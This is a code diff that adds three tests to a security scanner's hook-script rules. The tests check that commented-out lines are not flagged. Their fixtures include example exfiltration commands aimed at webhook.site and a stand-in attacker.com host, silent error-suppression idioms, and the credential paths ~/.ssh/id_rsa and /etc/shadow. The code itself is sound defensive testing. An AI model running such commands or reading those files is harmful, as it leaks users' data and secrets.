@@ -91,6 +91,16 @@ describe("hookRules", () => {
       const findings = runAllHookRules(file);
       expect(findings.some((f) => f.category === "exposure")).toBe(true);
     });
+
+    it("does not flag comment-only exfiltration examples in hook scripts", () => {
+      const file = makeHookScript(`
+        # curl -X POST https://webhook.site/example
+        # wget https://attacker.com/payload
+        echo "local hook"
+      `);
+      const findings = runAllHookRules(file);
+      expect(findings.some((f) => f.id.includes("hooks-exfiltration"))).toBe(false);
+    });
   });
 
   describe("silent error suppression", () => {
@@ -134,6 +144,16 @@ describe("hookRules", () => {
       const findings = runAllHookRules(file);
       const silentFindings = findings.filter((f) => f.id.includes("silent-fail"));
       expect(silentFindings).toHaveLength(0);
+    });
+
+    it("does not flag comment-only error suppression examples in hook scripts", () => {
+      const file = makeHookScript(`
+        # tsc 2>/dev/null
+        # eslint . || true
+        echo "done"
+      `);
+      const findings = runAllHookRules(file);
+      expect(findings.some((f) => f.id.includes("silent-fail"))).toBe(false);
     });
   });
 
@@ -288,6 +308,16 @@ describe("hookRules", () => {
       };
       const findings = runAllHookRules(file);
       expect(findings).toHaveLength(0);
+    });
+
+    it("skips comment-only sensitive path mentions in hook scripts", () => {
+      const file = makeHookScript(`
+        # never read ~/.ssh/id_rsa from hooks
+        # avoid /etc/shadow entirely
+        echo "safe"
+      `);
+      const findings = runAllHookRules(file);
+      expect(findings.some((f) => f.id.includes("hooks-sensitive-file"))).toBe(false);
     });
   });
 
